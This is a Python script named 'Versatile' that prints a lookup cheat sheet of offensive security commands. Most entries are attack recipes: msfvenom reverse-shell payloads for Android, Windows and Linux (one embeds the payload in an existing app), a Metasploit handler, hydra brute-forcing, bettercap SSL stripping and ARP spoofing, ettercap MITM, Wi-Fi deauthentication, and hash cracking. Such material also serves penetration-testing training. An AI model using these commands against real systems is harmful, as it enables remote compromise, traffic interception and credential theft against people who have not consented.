import os
import pyfiglet
import colorama
from colorama import Fore
from termcolor import colored
from pyfiglet import Figlet
print(colored("####################################################################", 'blue', 'on_grey'))
print("")
y = Figlet(font='standard')
print(colored(y.renderText('           Versatile'), 'blue', 'on_grey'))
print(colored("####################################################################", 'blue', 'on_grey'))
print (" ")
print (colored("                      			       ~ Versatile Institute", 'red'))
print (" ")
print (colored(" [For basic commands type 'Basic_Commands' && Search By Tool Name]",'red'))
print (" ")
x = input(colored(' Search >>> ', 'white', attrs=['blink']));
print (" ")
if x == 'msfvenom':
	print ("	Msfvenom For Android") ;
	print ("") ;
	print ("		msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> R > file.apk") ;
	print ("") ;
	print ("") ;
	print ("	Msfvenom For Windows") ;
	print ("") ;
	print ("") ;
	print ("		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o file.exe") ;
	print ("") ;
	print ("	Msfvenom For Linux") ;
	print ("") ;
	print ("") ;
	print ("		msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o file.elf") ;
	print ("") ;
	print ("") ;
	print ("	For Compiling") ;
	print ("") ;
	print ("		msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x <app to be compile> -k R > file.apk") ;
	print ("") ;
	print ("")

if x == 'nmap':
	print ("	Nmap's Important args");
	print ("		-Pn: No ping scan (Not detectable)");
	print ("		-f : For firewall bypass");
	print ("		-F : Scanning only default ports (Fast)");
	print ("		-p : To specify ports range");
	print ("		-sV: To detect working service of port");
	print ("		-O : OS detection");
	print ("		-A : To aggressively scan host");
	print ("		--script: To use scripts in scanning");
	print ("		-v : verbose");
	print ("	nmap -f -Pn -O <ip> -p <0-65535> -sV --script=<name> -v")

if x == 'hydra':
	print ("	Hydra's Important args");
	print ("		-L: To specify username list")
	print ("		-P: To specify password list")
	print ("		-M: To specify Target list")
	print ("	hydra -L userlist.txt -P passlist.txt -M targetlist.txt <service>")
	print ("	hydra -l username -p password <ip> ssh ")

if x == 'bettercap':
	print ("	Install: apt-get install bettercap")
	print ("		sudo bettercap -iface wlan0 (-iface for interface)")
	print ("		<bettercap> caplets.update")
	print ("		<bettercap> caplets.show")
	print ("		<bettercap> set http.proxy.sslstrip true")
	print ("		<bettercap> hstshijack/hstshijack")
	print ("		<bettercap> net.probe on")
	print ("		<bettercap> net.sniff on")
	print ("		<bettercap> arp.spoof on")

if x == 'msfconsole':
	print ("	Msfconsole")
	print ("		use exploit/multi/handler")
	print ("		set payload windows/x64/meterpreter/reverse_tcp")
	print ("		set rhosts <ip> ")
	print ("		set rport <port>")
	print ("		set lhost <self ip>")
	print ("		set lport <self port>")


if x == 'airodump-ng':
	print ("	Airodump-ng")
	print ("		Important strings")
	print ("		--bssid: To specify bssid")
	print ("		-c     : To specify channel number")
	print ("		-w     : To specify filename")
	print ("	airodump-ng --bssid 00:00:00:00:00:00 -c 1 -w filename <interface>")

if x == 'aireplay-ng':
	print ("	Aireplay-ng")
	print ("		Important strings")
	print ("		--deauth: attacking time <00>")
	print ("		-a 	: To specify bssid for deauthenticating")
	print ("	aireplay-ng --deauth 02 -a 00:00:00:00:00:00 <interface>")

if x == 'ettercap':
	print ("	Ettercap")
	print ("		-M: To perform mitm attack")
	print ("		-T: Text mode only")
	print ("		-Q: Quiet mode")
	print ("		-i: To specify interface name")
	print ("	ettercap -M <method> /router// /self-ip// -i <interface>")

if x == 'openssl':
	print ("	Openssl")
	print ("		-e: To encrypt file")
	print ("		-d: To decrypt file")
	print ("		-in: input file")
	print ("		-out: output file")
	print ("		-salt: To add salt")
	print ("	openssl enc -<format> -e -salt -in <input-file> -out <output-file>")

if x == 'steghide':
	print ("	Steghide")
	print ("		embed: To perform embedding")
	print ("		extract: To perform extracting")
	print ("		-ef: To embed a file")
	print ("		-cf: To add cover file")
	print ("		-sf: To specify steg file")
	print ("		-p : To specify password")
	print ("	steghide embed -ef <important.txt> -cf <Image.jpg>")
	print ("	steghide extract -sf <steg.jpg>")

if x == 'Basic_Commands':
	print ("	ls : To see files")
	print ("	cd : To enter a directory")
	print ("	ifconfig : To see our own ip-address")
	print ("	history : To see the history of terminal")
	print ("	pwd : To show our current directory")
	print ("	mkdir : To make a directory")
	print ("	rm : To remove a file or directory")
	print ("	nano : To edit a file")
	print ("	cat : To read a file in terminal")
	print ("	cp : To copy a file or directory")
	print ("	mv : To move a file or directory")
	print ("	clear : To clear your terminal")
	print ("	grep : To see only specific word")
	print ("	apt-get update : To update system")
	print ("	apt-get upgrade : To upgrade system")
	print ("	apt-get install : To install package")
	print ("	sort : To sort data of file")
	print ("	unique : To show unique line or word")
	print ("	whoami : shows current user")
	print ("	locate : To find a file in server")
	print ("	echo : To echo the text")
	print ("	ss : To show active working ports")
	print ("	sudo su : To enter into ROOT user")
	print ("	exit : To exit terminal or to exit user")

if x == 'john':
	print ("	John")
	print ("		--format : To specify hash format")
	print ("		--wordlist : To specify wordlist")
	print ("	john --format=<hash> --wordlist=<path-to-wordlist> <file-containing-hash>")

if x == 'hashcat':
	print ("	Hashcat")
	print ("		-a : To specify attack mode")
	print ("		-m : To specify hash type ")
	print ("	hashcat -a 0 -m 100 <hash-file> <wordlist-file>")


if x == 'smbclient':
	print ("	Smbclient")
	print ("		-L : To list ")
	print ("		-U : To specify Username")
	print ("		-P : To specify Password")
	print ("	smbclient -L \\\\<ip>\\")
	print ("	smbclient \\\\<ip>\\<folder-name>")

if x == 'iptables':
	print ("	Iptables")
	print ("		-A : Append To chain")
	print ("		-i : For specifying interface")
	print ("		-s : Target IP-Address")
	print ("		-j : target for rule")
	print ("	iptables -A INPUT -i wlan0 -s <ip> -j DROP")


